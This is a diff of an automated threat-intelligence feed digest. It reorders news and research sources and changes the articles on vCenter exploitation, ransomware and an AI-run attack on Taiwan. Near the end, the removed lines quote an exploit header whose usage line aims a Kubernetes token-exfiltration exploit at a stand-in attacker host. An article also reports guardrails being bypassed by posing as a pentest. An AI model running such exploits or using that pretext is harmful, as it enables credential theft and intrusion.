@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-08-12T16:05:43.392929+00:00",
+  "generated_at": "2026-08-12T17:07:50.854691+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_items": 2090,
@@ -18,6 +18,13 @@
       "item_count": 15,
       "in_window_count": 5
     },
+    "SentinelOne Labs": {
+      "url": "https://www.sentinelone.com/labs/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
@@ -32,33 +39,12 @@
       "item_count": 25,
       "in_window_count": 0
     },
-    "SentinelOne Labs": {
-      "url": "https://www.sentinelone.com/labs/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Microsoft Security Blog": {
       "url": "https://www.microsoft.com/en-us/security/blog/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 3
-    },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
+      "in_window_count": 2
     },
     "Kaspersky Securelist": {
       "url": "https://securelist.com/feed/",
@@ -67,15 +53,8 @@
       "item_count": 10,
       "in_window_count": 4
     },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
-    },
-    "Citizen Lab": {
-      "url": "https://citizenlab.ca/feed/",
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
@@ -87,6 +66,20 @@
       "status": "ok",
       "item_count": 50,
       "in_window_count": 4
+    },
+    "Citizen Lab": {
+      "url": "https://citizenlab.ca/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
     },
     "Cisco Talos": {
       "url": "https://feeds.feedburner.com/feedburner/Talos",
@@ -137,6 +130,13 @@
       "item_count": 10,
       "in_window_count": 1
     },
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 40,
+      "in_window_count": 3
+    },
     "Red Canary": {
       "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
@@ -151,13 +151,6 @@
       "item_count": 50,
       "in_window_count": 11
     },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 40,
-      "in_window_count": 3
-    },
     "watchTowr Labs": {
       "url": "https://labs.watchtowr.com/rss/",
       "cohort": "offensive_vulnerability_research",
@@ -165,9 +158,9 @@
       "item_count": 15,
       "in_window_count": 0
     },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
+      "cohort": "offensive_vulnerability_research",
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
@@ -186,18 +179,18 @@
       "item_count": 10,
       "in_window_count": 2
     },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
     "Proofpoint Threat Insight": {
       "url": "https://www.proofpoint.com/us/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
-    },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "parse_error",
-      "item_count": 0,
       "in_window_count": 0
     },
     "Active Countermeasures": {
@@ -228,6 +221,13 @@
       "item_count": 10,
       "in_window_count": 0
     },
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
+      "cohort": "threat_research_primary",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
     "Datadog Security Labs": {
       "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
       "cohort": "cloud_identity_infrastructure",
@@ -241,6 +241,13 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
+    },
+    "Huntress": {
+      "url": "https://www.huntress.com/blog/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
     },
     "AWS Security Blog": {
       "url": "https://aws.amazon.com/blogs/security/feed/",
@@ -256,12 +263,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Huntress": {
-      "url": "https://www.huntress.com/blog/rss.xml",
-      "cohort": "detection_response_operations",
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Rapid7": {
       "url": "https://www.rapid7.com/blog/rss/",
@@ -270,12 +277,12 @@
       "item_count": 20,
       "in_window_count": 5
     },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
+    "Sysdig": {
+      "url": "https://sysdig.com/feed/",
+      "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "item_count": 100,
+      "in_window_count": 2
     },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
@@ -284,13 +291,6 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
@@ -298,12 +298,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Sysdig": {
-      "url": "https://sysdig.com/feed/",
-      "cohort": "detection_response_operations",
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 2
+      "item_count": 20,
+      "in_window_count": 0
     },
     "Cloudflare Radar": {
       "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
@@ -319,13 +319,6 @@
       "item_count": 100,
       "in_window_count": 3
     },
-    "Google DeepMind Blog": {
-      "url": "https://deepmind.google/blog/rss.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 2
-    },
     "Coveware": {
       "url": "https://www.coveware.com/blog?format=rss",
       "cohort": "ransomware_ecrime_financial_crime",
@@ -333,16 +326,16 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Google DeepMind Blog": {
+      "url": "https://deepmind.google/blog/rss.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 2
+    },
     "Chainalysis": {
       "url": "https://www.chainalysis.com/blog/feed/",
       "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
-    },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
-      "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 3
@@ -354,12 +347,12 @@
       "item_count": 5,
       "in_window_count": 5
     },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
+      "item_count": 10,
+      "in_window_count": 3
     },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
@@ -367,6 +360,13 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 3
+    },
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 15
     },
     "Google Cloud Security": {
       "url": "https://cloudblog.withgoogle.com/rss/",
@@ -382,13 +382,6 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
       "cohort": "cyber_news_breach_reporting",
@@ -396,12 +389,26 @@
       "item_count": 10,
       "in_window_count": 10
     },
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
     "AI Snake Oil": {
       "url": "https://www.aisnakeoil.com/feed",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 0
+    },
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 24
     },
     "Dark Reading": {
       "url": "https://www.darkreading.com/rss.xml",
@@ -417,26 +424,19 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 24
-    },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
       "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 2
+    },
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 7
     },
     "Troy Hunt": {
       "url": "https://www.troyhunt.com/rss/",
@@ -445,12 +445,12 @@
       "item_count": 15,
       "in_window_count": 1
     },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 7
+      "in_window_count": 2
     },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
@@ -501,19 +501,19 @@
       "item_count": 20,
       "in_window_count": 3
     },
-    "Intel 471": {
-      "url": "https://intel471.com/blog/feed",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
     "The Hacker News": {
       "url": "https://feeds.feedburner.com/TheHackersNews",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 50,
       "in_window_count": 50
+    },
+    "Intel 471": {
+      "url": "https://intel471.com/blog/feed",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -529,19 +529,19 @@
       "item_count": 25,
       "in_window_count": 21
     },
-    "tl;dr sec": {
-      "url": "https://tldrsec.com/feed.xml",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Embrace the Red": {
       "url": "https://embracethered.com/blog/index.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 0
+    },
+    "tl;dr sec": {
+      "url": "https://tldrsec.com/feed.xml",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Risky Business News": {
       "url": "https://risky.biz/feeds/risky-business-news/",
@@ -1013,13 +1013,12 @@
           "supply_chain"
         ],
         "affected_products": [
-          "Kubernetes",
-          "GitHub"
+          "Kubernetes"
         ]
       },
       "cluster_count": 3,
       "article_count": 4,
-      "cohesion": 0.2,
+      "cohesion": 0.393,
       "shared_strong_signals": [
         "Kubernetes"
       ],
@@ -1403,6 +1402,78 @@
     ]
   },
   "items": [
+    {
+      "source": "CyberScoop",
+      "cohort": "cyber_news_breach_reporting",
+      "category": "cyber_news_breach_reporting",
+      "title": "Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan",
+      "link": "https://cyberscoop.com/near-autonomous-ai-attack-government-target-taiwan/",
+      "published": "2026-08-12T17:05:01+00:00",
+      "summary": "Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .",
+      "author": "Tim Starks",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion",
+          "supply_chain",
+          "apt_espionage"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "government",
+          "critical_infrastructure"
+        ],
+        "affected_products": [
+          "GitHub",
+          "Anthropic/Claude"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "incident_report",
+        "confidence_tier": "tier_4_news",
+        "role_map": {
+          "GitHub": "target",
+          "Anthropic/Claude": "target"
+        },
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 10,
+      "full_body": "Advertisement Get our latest cybersecurity news first on Google. Click here! Close Suspected Chinese hackers used open-source artificial intelligence models to run a cyberattack against the Taiwanese government in the first publicly known case of an autonomous AI hack hitting a government target, according to research published Wednesday. The hackers extracted more than 2,500 personnel records, among other data, in the “near-autonomous attack,” researchers at Israeli cyber firm Dream wrote in a blog post . The attackers set up the framework so that it could “adapt mid-operation without human intervention.” The framework “implements dedicated research phases it calls ‘Learning Cycles’ — autonomous sessions where the AI system searches vulnerability databases, GitHub repositories, and security research publications for techniques specifically applicable to its target government’s infrastructure,” the post reads. And then it kept going. Advertisement “The attacker didn’t stop at primary targets,” Dream said. “It expanded the operation to government IT supply chain vendors, a nuclear safety agency, a government email system, and 7+ energy sector companies — scanning them all in parallel for misconfigurations, exposed admin interfaces, and exploitable vulnerabilities.” It also learned from its mistakes as it went on, Dream said in identifying what stood out about the campaign. Autonomous AI-powered cyberattacks have raised alarms in the past: Anthropic reported last fall that it stopped the first autonomous cyber espionage campaign, although researchers noted that the “autonomous” campaign still required significant human work . The Financial Times first reported the Dream research and details on the target. The hackers used two popular open-source AI frameworks, Hermes and OpenClaw, to set up the Taiwan operation. They bypassed safety guardrails by framing the work as authorized penetration testing, according to Dream. Advertisement The firm discovered the operation via an online archive of 160 megabytes and nearly 1,400 files, revealing “a multi-agent AI system that achieved confirmed, real-world compromises against state infrastructure.” As with the autonomous cyber espionage campaign uncovered last fall, the attack Dream examined also noted the need for human tinkering. “We increasingly see threat actors leveraging AI for autonomous offensive operations,” the company wrote. “But building a system that actually works at this level takes more work than ‘just’ running a model. It demands careful adjustment to the specific task, optimization of agent coordination, and fine-tuning of decision logic — the kind of sophistication evident in this framework’s Bayesian prioritization, self-correction loops, and adaptive research cycles.” Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops (Getty Images) (Getty Images) Corrupted damaged image of a politician giving a speech in a press conference: corrupted data, manipulation and deepfakes concept Latest Podcasts What the Section 702 lapse means for cybersecurity The SOC wasn’t built for this Why Cybersecurity is at the heart of the US-China AI race A builder’s view of the AI arms race Government NATO and an AI startup can now name and track software vulnerabilities U.S., South Korean government agencies caution to be on lookout for Gunra ransomware gang Capitol Hill wants to know if executive branch, foreign allies coordinated enough to combat scams The water sector just got it's wake-up call. Again. Technology How companies could share cyber risks without exposing their secrets Sen. Wyden urges feds to discard older, insecure, public-facing VPNs Microsoft, tech companies throw weight behind spread of open-source AI White House accuses Chinese company of distilling Anthropic’s Fable Threats Delta investigates in-flight Wi-Fi spoofing on post-DEF CON flight from Las Vegas UK man tied to The Com sentenced fo",
+      "fetch_status": "ok"
+    },
+    {
+      "source": "BleepingComputer",
+      "cohort": "cyber_news_breach_reporting",
+      "category": "cyber_news_breach_reporting",
+      "title": "Plug and Pwn attack uses fake USB devices for Windows SYSTEM access",
+      "link": "https://www.bleepingcomputer.com/news/security/plug-and-pwn-attack-uses-fake-usb-devices-for-windows-system-access/",
+      "published": "2026-08-12T16:05:12+00:00",
+      "summary": "Security researchers have disclosed new \"Plug and Pwn\" attacks that abuse the Windows Plug and Play feature to trigger Windows into installing vulnerable or insecure vendor software and gain SYSTEM privileges. [...]",
+      "author": "Lawrence Abrams",
+      "in_window": true,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "news_report",
+        "confidence_tier": "tier_4_news",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      },
+      "score": 6
+    },
     {
       "source": "Team Cymru",
       "cohort": "ransomware_ecrime_financial_crime",
@@ -2487,7 +2558,7 @@
         }
       },
       "score": 12,
-      "full_body": "Attackers Exploit VMware vCenter Vulnerability to Gain Persistent Remote Access  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Threat Intelligence Threat actors have begun to actively exploit a recently patched critical security flaw in Broadcom VMware vCenter, according to new findings from QUIRSO. The vulnerability in question is CVE-2026-59310 (CVSS score: 9.8), a directory-traversal vulnerability in the VMware vCenter server that a malicious actor with network access can exploit to execute arbitrary code. Patches for the flaw were released by Broadcom late last month. The German cybersecurity company said it discovered the activity following an incident response engagement. The attack chain is said to have exhibited path traversal activity consistent with the flaw, followed by the deployment of a malicious cron job to establish persistence on the host using reverse_ssh, an open-source tool used for setting up SSH connections to threat actor-controlled infrastructure. Compromised systems identified by QUIRSO were found to first establish contact with the attacker's domains on August 3, five days after Broadcom publicly disclosed the flaws. In all, there are as many as 361 unique victim IP addresses located across 47 countries. Most of them are located in Germany, the U.S., Turkey, Iran, and France. \"While the attacker might have had prior knowledge of the vulnerability, the strong correlation between the time of disclosure and exploitation suggests the disclosure as the initial starting point for the campaign,\" QUIRSO added. It's not clear who is behind the exploitation campaign, but it's believed to be the work of a suspected advanced persistent threat (APT) actor. It's worth pointing out that VMware appliances have been a lucrative target for Chinese threat actors like UNC5174 , who have weaponized security flaws impacting VMware Tools and VMware vCenter in various espionage campaigns. In April 2025, SentinelOne disclosed details of a threat cluster dubbed PurpleHaze that targeted a South Asian government supporting entity with a Windows backdoor called GoReShell, which uses functionalities from the reverse_ssh tool to establish reverse SSH connections to attacker-controlled hosts. The use of reverse_ssh is notable as it allows the attacker to establish an outbound connection to an endpoint under their control, effectively bypassing security controls designed to prevent suspicious inbound requests. \"The presence of reverse_ssh should not, by itself, be treated as proof of malicious activity,\" QUIRSO noted. \"In combination with unauthorized installation, unexpected outbound connections or execution on a vulnerable vCenter appliance, however, it is a high-priority indicator requiring investigation.\" The disclosure comes as Defused Cyber said it's observing a spike in scanning against VMware vCenter that is indicative of potential exploitation efforts targeting CVE-2026-59309 (CVSS score: 9.8). \"Our honeypots are logging increased fingerprinting – such as version probes via POST /sdk/ (RetrieveServiceContent) and walks of the /websso SAML SSO flow – coinciding with Broadcom's VMSA-2026-0006 (CVE-2026-59309, unauth auth-bypass in vmdir, CVSS 9.8),\" the cybersecurity company said. Denis Szadkowski, COO and co-founder of QUIRSO GmbH, told The Hacker News that there is not enough evidence at this stage to correlate exploitation and scanning efforts using CVE-2026-59309 with the intrusion set or the attacker infrastructure associated with CVE-2026-59310. \"What we can say with much higher confidence is that the activity we investigated represents a successful compromise rather than merely exploitation attempts, and the forensic evidence strongly points toward CVE-2026-59310 as the initial access vector,\" Szadkowski added. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  APT , enterprise security , exploit",
+      "full_body": "Attackers Exploit VMware vCenter Vulnerability to Gain Persistent Remote Access  Ravie Lakshmanan  Aug 12, 2026 Vulnerability / Threat Intelligence Threat actors have begun to actively exploit a recently patched critical security flaw in Broadcom VMware vCenter, according to new findings from QUIRSO. The vulnerability in question is CVE-2026-59310 (CVSS score: 9.8), a directory-traversal vulnerability in the VMware vCenter server that a malicious actor with network access can exploit to execute arbitrary code. Patches for the flaw were released by Broadcom late last month. The German cybersecurity company said it discovered the activity following an incident response engagement. The attack chain is said to have exhibited path traversal activity consistent with the flaw, followed by the deployment of a malicious cron job to establish persistence on the host using reverse_ssh, an open-source tool used for setting up SSH connections to threat actor-controlled infrastructure. Compromised systems identified by QUIRSO were found to first establish contact with the attacker's domains on August 3, five days after Broadcom publicly disclosed the flaw. In all, there are as many as 361 unique victim IP addresses located across 47 countries. Most of them are located in Germany, the U.S., Turkey, Iran, and France. \"While the attacker might have had prior knowledge of the vulnerability, the strong correlation between the time of disclosure and exploitation suggests the disclosure as the initial starting point for the campaign,\" QUIRSO added. It's not clear who is behind the exploitation campaign, but it's believed to be the work of a suspected advanced persistent threat (APT) actor. It's worth pointing out that VMware appliances have been a lucrative target for Chinese threat actors like UNC5174 , who have weaponized security flaws impacting VMware Tools and VMware vCenter in various espionage campaigns. In April 2025, SentinelOne disclosed details of a China-nexus threat cluster dubbed PurpleHaze that targeted a South Asian government supporting entity with a Windows backdoor called GoReShell, which uses functionalities from the reverse_ssh tool to establish reverse SSH connections to attacker-controlled hosts. The use of reverse_ssh is notable as it allows the attacker to establish an outbound connection to an endpoint under their control, effectively bypassing security controls designed to prevent suspicious inbound requests. \"The presence of reverse_ssh should not, by itself, be treated as proof of malicious activity,\" QUIRSO noted. \"In combination with unauthorized installation, unexpected outbound connections or execution on a vulnerable vCenter appliance, however, it is a high-priority indicator requiring investigation.\" The disclosure comes as Defused Cyber said it's observing a spike in scanning against VMware vCenter that is indicative of potential exploitation efforts targeting CVE-2026-59309 (CVSS score: 9.8). \"Our honeypots are logging increased fingerprinting – such as version probes via POST /sdk/ (RetrieveServiceContent) and walks of the /websso SAML SSO flow – coinciding with Broadcom's VMSA-2026-0006 (CVE-2026-59309, unauth auth-bypass in vmdir, CVSS 9.8),\" the cybersecurity company said. Denis Szadkowski, COO and co-founder of QUIRSO GmbH, told The Hacker News that there is not enough evidence at this stage to correlate exploitation and scanning efforts using CVE-2026-59309 with the intrusion set or the attacker infrastructure associated with CVE-2026-59310. \"What we can say with much higher confidence is that the activity we investigated represents a successful compromise rather than merely exploitation attempts, and the forensic evidence strongly points toward CVE-2026-59310 as the initial access vector,\" Szadkowski added. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  APT , enterprise securit",
       "fetch_status": "ok"
     },
     {
@@ -3798,7 +3869,7 @@
           "products": []
         }
       },
-      "score": 22
+      "score": 21
     },
     {
       "source": "The Hacker News",
@@ -3829,9 +3900,7 @@
           "products": []
         }
       },
-      "score": 9,
-      "full_body": "DeadLock Ransomware Uses Polygon Smart Contracts to Make Extortion Infra Harder to Disrupt  Ravie Lakshmanan  Aug 11, 2026 Ransomware / Blockchain The ransomware group known as DeadLock has been observed using decentralized infrastructure to facilitate victim communications and data leak operations in a bid to improve operational resilience. \"Its recovery ecosystem combines the Session messaging network with blockchain-backed services that store and deliver resources used throughout the extortion process,\" the Microsoft Threat Intelligence team said . The tech giant said it observed the ransomware being deployed by multiple threat actors, including an affiliate for Lynx and INC ransomware. DeadLock was first detected in July 2025, employing double extortion tactics to encrypt victim environments and apply pressure by threatening to publicly release exfiltrated data. As of this month, the group has claimed 96 victims , with most of them located in Italy, Spain, Poland, Türkiye, and the U.S. In an analysis published earlier this January, Singapore-headquartered Group-IB said the group has managed to keep a lower profile than its peers owing to it not being associated with any known affiliate programs and for lacking a data leak site (DLS). According to Ransomware.Live, the first set of victims was not discovered until late May 2026. Attacks mounted by the group are known to encrypt files with the \".dlock\" extension, change file icons using a custom \".ico\" file written to disk, and modify the victim's desktop wallpaper to display the message \"Your infrastructure DeadLocked\" and instruct them to open the ransom note. The ransomware adopts a selective encryption model to exclude certain directories, file extensions, and file names from encryption. It employs a hybrid cryptographic design that combines Curve25519 elliptic-curve cryptography with the XChaCha20 stream cipher for file encryption. The ransom note urges the victim to download a decentralized, end-to-end encrypted messaging application called Session to get in touch and make a Bitcoin or Monero payment after sharing a decrypted version of a locked file as proof. One version of the ransom note also claims to provide the compromised company with a \"security report\" that details the steps the attackers took to break into their network. Furthermore, the note states that victims who make a payment will receive security recommendations to stop future attacks, along with assurances that they will not be targeted again in the future. HTML recovery chat infrastructure summary Another important feature is its implementation of a language- or country-based geofencing to avoid execution in environments associated with former Soviet and Commonwealth of Independent States (CIS)-linked countries as well as select Middle Eastern countries. Separately, it includes a \"resource-aware throttling mechanism\" that ensures system responsiveness as the encryption process is underway and pauses it when memory usage exceeds 29% or CPU load exceeds 70%, while relying on AnyDesk for remote control of compromised hosts. For defense evasion and minimizing forensic evidence, it systematically erases logs and disables logging via Registry manipulation to prevent recording future events. The Windows version of the locker uses a PowerShell script to stop services that are not allowlisted and ensure they are not executed automatically after reboot. The script is also responsible for deleting Volume Shadow Copies and erasing itself in an attempt to cover its tracks. As a final cleanup step post successful encryption, the malware creates a batch script to delete its own binary from disk and then remove itself. Perhaps the most unusual aspect of the ransomware is its use of an HTML note (\"RECOVERY_CHAT.<UID>.html\") that's dropped in all drive root directories and all Desktop folders. \"Unlike the text note, the HTML note is a full interactive web application with a self-contained single-page application that ",
-      "fetch_status": "ok"
+      "score": 8
     },
     {
       "source": "Google Cloud Security",
@@ -3854,36 +3923,6 @@
         "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 7
-    },
-    {
-      "source": "BleepingComputer",
-      "cohort": "cyber_news_breach_reporting",
-      "category": "cyber_news_breach_reporting",
-      "title": "Wesco confirms security incident after ExfilSquad claims data theft",
-      "link": "https://www.bleepingcomputer.com/news/security/wesco-confirms-security-incident-after-exfilsquad-claims-data-theft/",
-      "published": "2026-08-11T15:59:35+00:00",
-      "summary": "Global supply chain and distribution giant Wesco has confirmed in a statement for BleepingComputer that it is investigating a cybersecurity incident. [...]",
-      "author": "Bill Toulas",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_4_news",
         "role_map": {},
         "weak_tags": {
           "products": []
@@ -4639,33 +4678,24 @@
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [
-          "Kubernetes",
-          "Anthropic/Claude",
-          "GitHub"
+          "Kubernetes"
         ],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-61459"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
-        "urgency_signals": [
-          "poc_available",
-          "critical_cvss"
-        ],
+        "urgency_signals": [],
         "content_type": "news_report",
         "confidence_tier": "tier_1_offensive_research",
         "role_map": {
-          "Kubernetes": "target",
-          "Anthropic/Claude": "target",
-          "GitHub": "target"
+          "Kubernetes": "target"
         },
         "weak_tags": {
           "products": []
         }
       },
       "score": 10,
-      "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools 